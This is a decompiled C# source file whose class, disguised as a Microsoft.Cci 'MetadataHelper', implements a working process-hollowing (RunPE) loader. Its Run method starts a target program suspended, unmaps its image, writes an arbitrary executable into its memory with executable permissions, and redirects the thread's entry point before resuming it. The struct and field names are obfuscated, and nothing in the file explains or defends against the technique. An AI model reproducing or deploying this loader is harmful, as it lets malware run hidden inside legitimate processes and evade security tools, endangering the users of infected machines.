using System;
using System.Runtime.InteropServices;

namespace Microsoft.Cci;

public class MetadataHelper
{
	private struct Struct0
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public Struct1 struct1_0;

		public uint uint_7;

		public uint uint_8;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		public uint uint_19;

		public uint uint_20;

		public uint uint_21;

		public uint uint_22;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] byte_0;
	}

	private struct Struct1
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] byte_0;

		public uint uint_7;
	}

	private struct Struct2
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public ushort ushort_7;

		public ushort ushort_8;

		public ushort ushort_9;

		public ushort ushort_10;

		public ushort ushort_11;

		public ushort ushort_12;

		public ushort ushort_13;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] ushort_14;

		public ushort ushort_15;

		public ushort ushort_16;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] ushort_17;

		public int int_0;
	}

	private struct Struct3
	{
		public uint uint_0;

		public Struct4 struct4_0;

		public Struct5 struct5_0;
	}

	private struct Struct4
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public ushort ushort_2;

		public ushort ushort_3;
	}

	private struct Struct5
	{
		public ushort ushort_0;

		public byte byte_0;

		public byte byte_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;

		public uint uint_8;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public ushort ushort_7;

		public ushort ushort_8;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public Struct6[] struct6_0;
	}

	private struct Struct6
	{
		public uint uint_0;

		public uint uint_1;
	}

	private struct Struct7
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public byte[] byte_0;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public ushort ushort_0;

		public ushort ushort_1;

		public uint uint_6;
	}

	private struct Struct8
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public uint uint_0;

		public uint uint_1;
	}

	private struct Struct9
	{
		public uint uint_0;

		public string string_0;

		public string string_1;

		public string string_2;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;

		public uint uint_8;

		public short short_0;

		public short short_1;

		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public IntPtr intptr_2;

		public IntPtr intptr_3;
	}

	private enum Enum0 : uint
	{
		const_0 = 16777216u,
		const_1 = 67108864u,
		const_2 = 16u,
		const_3 = 512u,
		const_4 = 134217728u,
		const_5 = 262144u,
		const_6 = 33554432u,
		const_7 = 2048u,
		const_8 = 4096u,
		const_9 = 4u,
		const_10 = 1024u,
		const_11 = 2u,
		const_12 = 1u,
		const_13 = 8u,
		const_14 = 524288u,
		const_15 = 65536u
	}

	private enum Enum1 : uint
	{
		const_0 = 4096u,
		const_1 = 8192u,
		const_2 = 524288u,
		const_3 = 536870912u,
		const_4 = 4194304u,
		const_5 = 1048576u,
		const_6 = 2097152u
	}

	private enum Enum2 : uint
	{
		const_0 = 16u,
		const_1 = 32u,
		const_2 = 64u,
		const_3 = 128u,
		const_4 = 1u,
		const_5 = 2u,
		const_6 = 4u,
		const_7 = 8u,
		const_8 = 256u,
		const_9 = 512u,
		const_10 = 1024u
	}

	private enum Enum3 : uint
	{
		const_0 = 65536u,
		const_1 = 65536u,
		const_2 = 65537u,
		const_3 = 65538u,
		const_4 = 65540u,
		const_5 = 65544u,
		const_6 = 65552u,
		const_7 = 65568u,
		const_8 = 65543u,
		const_9 = 65599u
	}

	private struct Struct10
	{
		public int int_0;

		public IntPtr intptr_0;

		public bool bool_0;
	}

	public static bool Run(byte[] fBytes, string sParameters, string sTarget)
	{
		Struct0 lpContext = default(Struct0);
		Struct2 @struct = default(Struct2);
		Struct3 struct2 = default(Struct3);
		Struct7 struct3 = default(Struct7);
		Struct8 lpProcessInformation = default(Struct8);
		Struct9 lpStartupInfo = default(Struct9);
		int lpNumberOfBytesWritten = 0;
		uint lpflOldProtect = 0u;
		int num = 0;
		GCHandle gCHandle = GCHandle.Alloc(fBytes, GCHandleType.Pinned);
		num = gCHandle.AddrOfPinnedObject().ToInt32();
		@struct = (Struct2)Marshal.PtrToStructure(new IntPtr(num), typeof(Struct2));
		struct2 = (Struct3)Marshal.PtrToStructure(new IntPtr(num + @struct.int_0), typeof(Struct3));
		lpStartupInfo.uint_0 = (uint)Marshal.SizeOf((object)lpStartupInfo);
		if (struct2.uint_0 == 17744 && @struct.ushort_0 == 23117)
		{
			if (!CreateProcess(sTarget, Convert.ToChar(32) + sParameters, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, Enum0.const_9, IntPtr.Zero, null, ref lpStartupInfo, out lpProcessInformation))
			{
				return false;
			}
			if (ZwUnmapViewOfSection(lpProcessInformation.intptr_0, new IntPtr(struct2.struct5_0.uint_6)))
			{
				if (!VirtualAllocEx(lpProcessInformation.intptr_0, new IntPtr(struct2.struct5_0.uint_6), struct2.struct5_0.uint_10, (Enum1)12288u, Enum2.const_2))
				{
					return false;
				}
				if (WriteProcessMemory(lpProcessInformation.intptr_0, new IntPtr(struct2.struct5_0.uint_6), fBytes, struct2.struct5_0.uint_11, out lpNumberOfBytesWritten))
				{
					for (int i = 0; i <= struct2.struct4_0.ushort_1 - 1; i++)
					{
						struct3 = (Struct7)Marshal.PtrToStructure(new IntPtr(num + @struct.int_0 + 248 + i * 40), typeof(Struct7));
						byte[] array = new byte[struct3.uint_2 + 1];
						for (int j = 0; j <= (int)(struct3.uint_2 - 1); j++)
						{
							array[j] = fBytes[struct3.uint_3 + j];
						}
						WriteProcessMemory(lpProcessInformation.intptr_0, new IntPtr(struct2.struct5_0.uint_6 + struct3.uint_1), array, Convert.ToUInt32(struct3.uint_2), out lpNumberOfBytesWritten);
						VirtualProtectEx(lpProcessInformation.intptr_0, new IntPtr(struct2.struct5_0.uint_6 + struct3.uint_1), struct3.uint_0, Enum2.const_2, out lpflOldProtect);
					}
					lpContext.uint_0 = 65543u;
					GetThreadContext(lpProcessInformation.intptr_1, ref lpContext);
					byte[] bytes = BitConverter.GetBytes(struct2.struct5_0.uint_6);
					WriteProcessMemory(lpProcessInformation.intptr_0, new IntPtr(lpContext.uint_13 + 8), bytes, 4u, out lpNumberOfBytesWritten);
					lpContext.uint_16 = struct2.struct5_0.uint_6 + struct2.struct5_0.uint_3;
					SetThreadContext(lpProcessInformation.intptr_1, ref lpContext);
					ResumeThread(lpProcessInformation.intptr_1);
					gCHandle.Free();
					return true;
				}
				return false;
			}
			return false;
		}
		return false;
	}

	[DllImport("kernel32.dll")]
	private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, Enum0 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref Struct9 lpStartupInfo, out Struct8 lpProcessInformation);

	[DllImport("kernel32.dll")]
	private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

	[DllImport("ntdll.dll")]
	private static extern bool ZwUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

	[DllImport("kernel32.dll")]
	private static extern bool VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, Enum1 flAllocationType, Enum2 flProtect);

	[DllImport("kernel32.dll")]
	private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, Enum2 flNewProtect, out uint lpflOldProtect);

	[DllImport("kernel32.dll")]
	private static extern bool GetThreadContext(IntPtr hThread, ref Struct0 lpContext);

	[DllImport("kernel32.dll")]
	private static extern bool SetThreadContext(IntPtr hThread, [In] ref Struct0 lpContext);

	[DllImport("kernel32.dll")]
	private static extern uint ResumeThread(IntPtr hThread);
}
